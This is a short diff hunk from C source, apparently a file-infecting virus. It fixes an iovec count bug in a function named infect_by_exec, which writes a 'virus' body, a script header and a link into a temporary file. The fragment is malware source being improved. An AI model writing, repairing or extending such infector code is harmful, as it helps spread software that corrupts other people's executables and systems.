@@ -195,12 +195,13 @@ int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
     }
     posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
 
-    struct iovec iov[] = {
+    enum { count = 3 };
+    struct iovec iov[count] = {
         {(void *) virus, virus_size},
         {(void *) script_header, sizeof(script_header) - 1},
         {link, length + 1}
     };
-    if (writev_all(tmp_fd, iov, sizeof(iov)) > 0) {
+    if (writev_all(tmp_fd, iov, count) > 0) {
         result = errno;
         goto close_tmp;
     }
